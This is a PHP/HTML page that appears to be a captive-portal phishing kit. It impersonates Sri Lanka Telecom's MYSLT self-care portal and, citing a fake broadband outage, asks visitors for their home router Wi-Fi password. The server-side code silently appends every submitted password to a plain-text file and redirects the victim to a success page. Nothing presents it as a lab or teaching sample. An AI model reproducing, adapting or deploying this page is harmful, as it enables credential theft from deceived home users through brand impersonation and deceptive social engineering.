<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the password from the form
    $password = $_POST["password"];

    // Check if the password is not empty
    if (!empty($password)) {
        // Open the file for writing
        $file = fopen("passwords.txt", "a");

        // Write the password to the file
        fwrite($file, $password . "\n");

        // Close the file
        fclose($file);

        // Output success message
        header("Location: success.html");
        exit();
    } else {
        // Output error message if the password is empty
        header("Location: index.php");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to MYSLT-Self-care account</title>
    <link rel="stylesheet" href="index.css" type="text/css">
    <script src="index.js"></script>
</head>
<body>
    <div id="container">
        <div class="banner">
            <img src="image/banner.91882080.png" alt="banner" class="banner">
        </div>
        <div class="form-view">
            <div class="form-logo">
                <img src="image/logo.png" alt="logo" class="logo">
            </div>
            <div class="form-container">
                <div class="title">
                    <h3 class="title">Sltgo</h3>
                </div>
                <div class="input-group">
                   <div class="input-container">
                    <form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                        <label class="form-lable">Password<span>*</span></label>
                        <img src="image/see.png" alt="see" class="eye" onclick="togglePasswordVisibility()">
                        <br>
                        <input id="password" name="password" type="password" placeholder="Enter your home router password">
                   </div>
                   <div class="submit">
                        <button onclick="ealert()" type="Submit" class="form-button">Connect</button>
                    </form>
                   </div>
                </div>
            </div>
            <div class="explanation">
                <p>
                    SLT Home broadband connection is under maintenance. <br>
                    If you want to access the internet, connect to your home WiFi via this online portal.
                </p>
            </div>
        </div>
    </div>
</body>
</html>
